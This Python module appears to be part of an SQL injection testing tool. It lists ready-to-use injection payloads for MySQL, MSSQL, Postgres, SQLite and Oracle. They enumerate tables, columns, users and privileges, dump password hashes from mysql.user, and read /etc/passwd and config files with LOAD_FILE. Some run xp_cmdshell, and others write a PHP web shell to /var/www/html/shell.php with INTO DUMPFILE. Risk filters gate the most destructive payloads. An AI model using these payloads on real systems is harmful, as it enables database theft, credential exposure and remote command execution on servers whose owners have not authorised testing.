# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Advanced SQLi payloads: stacked queries, DIOS, LFI, privilege escalation, enumeration."""

from __future__ import annotations

from typing import List

DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
    "mysql": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS SIGNED)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()),NULL-- -",
            "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
        ],
    },
    "mariadb": {
        "tables": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()),NULL-- -",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
        ],
    },
    "mssql": {
        "tables": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
            "' UNION SELECT TOP 1 table_name,NULL FROM information_schema.tables-- -",
            "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        ],
        "columns": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
        ],
    },
    "postgres": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -",
            "' AND 1=CAST((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1) AS int)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='public' LIMIT 1-- -",
        ],
    },
    "sqlite": {
        "tables": [
            "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)-- -",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
        ],
        "columns": [
            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' LIMIT 1-- -",
        ],
    },
    "oracle": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM all_tables WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1-- -",
            "' AND 1=CAST((SELECT table_name FROM user_tables WHERE rownum=1) AS INTEGER)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE rownum=1-- -",
        ],
    },
}


def get_db_contents_payloads(dbms: str, target: str = "tables") -> List[str]:
    """Return database contents enumeration payloads for *dbms*.

    *target* is either ``"tables"`` or ``"columns"``.
    """
    return DB_CONTENTS_PAYLOADS.get(dbms, {}).get(target, [])


STACKED_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        "'; SELECT SLEEP(1)-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mariadb": [
        "'; SELECT SLEEP(1)-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mssql": [
        "'; SELECT 1-- -",
        "'; SELECT @@version-- -",
        "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
        "'; EXEC xp_cmdshell('whoami')-- -",  # risk 3 only
    ],
    "postgres": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; SELECT current_database()-- -",
        "'; SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1-- -",
    ],
    "sqlite": [
        "'; SELECT sqlite_version()-- -",
        "'; SELECT name FROM sqlite_master WHERE type='table' LIMIT 1-- -",
    ],
    "oracle": [],  # Oracle does NOT support stacked queries
    "auto": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
    ],
}


def get_stacked_payloads(dbms: str, risk: int = 1) -> List[str]:
    """Return stacked query payloads for *dbms* filtered by *risk* level."""
    raw = STACKED_PAYLOADS.get(dbms, STACKED_PAYLOADS["auto"])
    if risk < 3:
        raw = [p for p in raw if "xp_cmdshell" not in p.lower()]
    return raw


DIOS_PAYLOADS: List[str] = [
    "concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/",
    "concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/",
    "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",
]


def get_dios_payloads() -> List[str]:
    """Return DIOS payload list (MySQL/MariaDB)."""
    return DIOS_PAYLOADS


LFI_PAYLOADS: List[str] = [
    "' UNION SELECT load_file('/etc/passwd'),NULL-- -",
    "' UNION SELECT load_file(0x2f6574632f706173737764),NULL-- -",
    "' UNION SELECT TO_base64(LOAD_FILE('/etc/passwd')),NULL-- -",
    "' UNION SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')),NULL-- -",
    "' UNION SELECT hex(load_file('/etc/passwd')),NULL-- -",
    "' UNION SELECT load_file('/etc/mysql/my.cnf'),NULL-- -",
    "' UNION SELECT load_file('/var/www/html/config.php'),NULL-- -",
    "' UNION SELECT load_file('C:/Windows/System32/drivers/etc/hosts'),NULL-- -",
    "' UNION SELECT load_file('C:/xampp/htdocs/index.php'),NULL-- -",
]


def get_lfi_payloads() -> List[str]:
    """Return LFI-via-LOAD_FILE payload list."""
    return LFI_PAYLOADS


PRIVESC_PAYLOADS: List[str] = [
    "' UNION SELECT (SELECT GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),NULL-- -",
    "' UNION SELECT (SELECT unhex(hex(GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e))) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,privilege_type,0x7c,is_grantable SEPARATOR 0x0a) FROM information_schema.user_privileges),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,table_schema,0x7c,privilege_type SEPARATOR 0x0a) FROM information_schema.schema_privileges),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x7c,table_name,0x7c,column_name,0x7c,privilege_type SEPARATOR 0x0a) FROM information_schema.column_privileges),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(grantee,0x7c,privilege_type,0x7c,is_grantable) FROM information_schema.user_privileges WHERE privilege_type='SUPER'),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(host,0x7c,user) FROM mysql.user WHERE Super_priv='Y'),NULL-- -",
    "' UNION SELECT (SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),NULL-- -",
    "' AND if(MID((SELECT file_priv FROM mysql.user WHERE user='root'),1,1)='Y',SLEEP(5),NULL)-- -",
    "' UNION SELECT @@slave_load_tmpdir,NULL-- -",
    "' UNION SELECT @@datadir,NULL-- -",
    "' UNION SELECT @@basedir,NULL-- -",
    "' UNION SELECT @@tmpdir,NULL-- -",
    "' UNION SELECT @@hostname,NULL-- -",
    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL INTO DUMPFILE '/var/www/html/shell.php'-- -",
    "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e,NULL INTO DUMPFILE '/var/www/html/shell.php'-- -",
]


def get_privesc_payloads(risk: int = 1) -> List[str]:
    """Return privilege escalation probe payloads filtered by *risk* level.

    INTO DUMPFILE / OUTFILE write payloads are only included at risk >= 3.
    """
    write_markers = ("INTO DUMPFILE", "INTO OUTFILE", "DUMPFILE", "OUTFILE")
    if risk < 3:
        return [p for p in PRIVESC_PAYLOADS if not any(m in p for m in write_markers)]
    return PRIVESC_PAYLOADS


ENUM_PAYLOADS: dict[str, List[str]] = {
    "version": [
        "' UNION SELECT @@version,NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "current_user": [
        "' UNION SELECT user(),NULL-- -",
        "' UNION SELECT system_user(),NULL-- -",
        "' UNION SELECT current_user(),NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -",
    ],
    "hostname": [
        "' UNION SELECT @@hostname,NULL-- -",
        "' UNION SELECT @@global.hostname,NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@hostname))-- -",
    ],
    "current_database": [
        "' UNION SELECT database(),NULL-- -",
        "' UNION SELECT schema(),NULL-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
    ],
    "list_databases": [
        "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -",
        "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x0a),NULL FROM information_schema.schemata-- -",
        "' UNION SELECT (SELECT GROUP_CONCAT(db) FROM mysql.db),NULL-- -",
    ],
    "list_users": [
        "' UNION SELECT user,NULL FROM mysql.user-- -",
        "' UNION SELECT GROUP_CONCAT(user SEPARATOR 0x0a),NULL FROM mysql.user-- -",
        "' UNION SELECT (SELECT GROUP_CONCAT(grantee) FROM information_schema.user_privileges),NULL-- -",
    ],
    "password_hashes": [
        "' UNION SELECT GROUP_CONCAT(host,0x7c,user,0x7c,password SEPARATOR 0x0a),NULL FROM mysql.user-- -",
        "' UNION SELECT GROUP_CONCAT(host,0x7c,user,0x7c,authentication_string SEPARATOR 0x0a),NULL FROM mysql.user-- -",
    ],
    "find_tables_by_column": [
        "' UNION SELECT GROUP_CONCAT(table_schema,0x7c,table_name SEPARATOR 0x0a),NULL FROM information_schema.columns WHERE column_name='TARGET_COLUMN'-- -",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.columns WHERE column_name='TARGET_COLUMN')))-- -",
    ],
    "conditional": [
        "' AND IF(1=1,'foo','bar')='foo'-- -",
        "' AND IF(1=2,'foo','bar')='bar'-- -",
        "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1-- -",
        "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=0-- -",
    ],
    "nth_row": [
        "' UNION SELECT {col},NULL FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {offset}-- -",
    ],
}


def get_enum_payloads(category: str) -> List[str]:
    """Return MySQL enumeration payloads for *category*."""
    return ENUM_PAYLOADS.get(category, [])


# ---------------------------------------------------------------------------
# Extraction targets — scalar SQL expressions per DBMS
# ---------------------------------------------------------------------------

EXTRACTION_TARGETS: dict[str, List[tuple[str, str]]] = {
    "mysql": [
        ("version",          "VERSION()"),
        ("current_user",     "CURRENT_USER()"),
        ("current_database", "DATABASE()"),
        ("tables",
         "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
         " FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
    ],
    "mariadb": [
        ("version",          "VERSION()"),
        ("current_user",     "CURRENT_USER()"),
        ("current_database", "DATABASE()"),
        ("tables",
         "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
         " FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
    ],
    "mssql": [
        ("version",          "CAST(@@version AS VARCHAR(512))"),
        ("current_user",     "SYSTEM_USER"),
        ("current_database", "DB_NAME()"),
        ("tables",
         "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
         " WHERE table_type='BASE TABLE')"),
    ],
    "postgres": [
        ("version",          "VERSION()"),
        ("current_user",     "CURRENT_USER"),
        ("current_database", "CURRENT_DATABASE()"),
        ("tables",
         "(SELECT STRING_AGG(table_name,',' ORDER BY table_name)"
         " FROM information_schema.tables WHERE table_schema='public')"),
    ],
    "sqlite": [
        ("version", "sqlite_version()"),
        ("tables",  "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"),
    ],
    "oracle": [
        ("version",       "(SELECT banner FROM v$version WHERE rownum=1)"),
        ("current_user",  "(SELECT USER FROM DUAL)"),
        ("tables",
         "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)"
         " FROM user_tables)"),
    ],
}

_EXTRACTION_TARGETS_GENERIC: List[tuple[str, str]] = [
    ("version",        "VERSION()"),
    ("sqlite_version", "sqlite_version()"),
    ("current_user",   "CURRENT_USER"),
    ("tables",         "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"),
]


def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
    """Return a list of (label, sql_expr) pairs to extract for *dbms*.

    Each expression is a scalar SQL expression returning a single string value,
    suitable for char-by-char extraction via ASCII(SUBSTRING(expr, pos, 1)).
    Ordered cheapest/most-useful first.
    """
    return EXTRACTION_TARGETS.get((dbms or "").lower(), _EXTRACTION_TARGETS_GENERIC)
